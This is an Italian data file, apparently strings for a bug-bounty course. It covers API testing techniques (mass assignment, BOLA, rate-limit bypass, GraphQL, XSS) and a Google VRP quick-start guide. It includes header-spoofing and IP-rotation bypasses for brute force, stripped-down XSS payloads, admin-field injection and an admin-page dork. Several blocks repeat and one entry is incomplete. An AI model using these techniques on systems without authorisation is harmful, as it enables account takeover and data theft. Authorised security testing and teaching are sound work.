testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

testingTechniques.name: Broken Object Level Authorization (BOLA)
testingTechniques.description: Accedi a oggetti di altri utenti cambiando ID
steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

testingTechniques.name: Rate Limiting Bypass
testingTechniques.description: Bypassa limiti di velocità per brute force o scraping
steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden

testingTechniques.name: XSS (Cross-Site Scripting)

steps: Testa ogni parametro riflesso con: script alert 1 script

Usa event handler: img src x onerror alert 1

reportingSteps: 1. Usa Google Issue Tracker (issuetracker.google.com) con tag VRP

quickStartGuide: Step 1: Vai su bughunters.google.com e studia il program policy
Step 2: Iscriviti a Google BugHunter University (gratuita, con certificati)
Step 3: Inizia da Google Docs/Sheets: hanno molti bug di business logic
Step 4: Studia il flusso OAuth: la maggior parte dei bug Google sono qui
Step 5: Testa cross-product: un bug in Drive impatta anche Photos/Gmail
Step 6: Usa Google stesso per enumerarsi: dorks come site:*.google.com inurl:admin
Step 7: Leggi il blog di Project Zero per capire la qualità attesa
Step 8: Sii paziente: Google VRP è molto competitivo
tips: 💡 Google VRP è IL programma più competitivo: 100+ hunter esperti al giorno
💡 Concentrati su prodotti meno battuti: Google Fit, Google Chat, Cloud Console
💡 I bug accettati sono spesso catene: 2-3 low = 1 high
💡 Studia i writeup su Project Zero: mostrano lo standard qualitativo
💡 Il reverse engineering di app mobile Google è spesso fruttuoso
💡 Google Docs/Sheets collaborative editing ha avuto decine di RCE storici
💡 Account multipli sono essenziali: crea 5-10 account Google per test
💡 Non riportare bug in vendor di terze parti (es. problema in libreria JS)
💡 Il triage è lento, non scoraggiarti se non rispondono in 2 settimane
